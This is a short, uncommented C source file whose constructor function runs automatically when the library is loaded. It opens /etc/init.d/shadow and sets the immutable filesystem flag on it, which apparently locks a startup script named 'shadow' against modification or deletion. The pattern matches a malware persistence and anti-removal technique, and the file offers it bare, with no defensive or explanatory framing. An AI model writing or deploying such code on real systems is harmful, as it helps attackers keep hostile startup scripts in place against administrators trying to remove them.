#include <stdio.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <linux/fs.h> // For FS_IOC_SETFLAGS
#include <errno.h>
#include <unistd.h>

int __attribute__((constructor)) ctor() 
{
    const char *file = "/etc/init.d/shadow";
    int fd = open(file, O_RDWR);

    if (fd == -1) {
        return 0;
    }

    int flags = FS_IMMUTABLE_FL|FS_EXTENT_FL;

    if (ioctl(fd, FS_IOC_SETFLAGS, &flags) == -1) {
        close(fd);
        return 0;
    }

    return 0;
}

